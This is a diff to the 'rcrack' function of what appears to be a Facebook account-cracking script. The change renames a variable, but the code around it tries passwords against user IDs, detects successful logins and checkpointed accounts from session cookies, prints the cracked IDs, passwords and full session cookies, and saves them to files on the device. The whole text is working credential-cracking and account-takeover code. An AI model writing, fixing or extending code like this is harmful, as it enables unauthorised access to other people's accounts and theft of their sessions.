@@ -263,7 +263,7 @@ def rcrack(uid,pwx,tl):
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[7:22]
+                uid = coki[7:22]
                 print('\r\r\033[1;32m(YKIMG-OK🔥)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                 cek_apk(session,coki)
                 open('/sdcard/YKIMG-OK.txt', 'a').write( uid+' | '+ps+'\n')
@@ -271,10 +271,10 @@ def rcrack(uid,pwx,tl):
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[24:39]
+                uid = coki[24:39]
                 print('\r\r\33[1;30m(YKIMG-CP🤕)  ' +uid+ ' | ' +ps+           '  \33[0;97m')
                 open('/sdcard/YKIMG-CP.txt', 'a').write( uid+' | '+ps+' \n')
-                cps.append(cid)
+                cps.append(uid)
                 break
             else:
                 continue
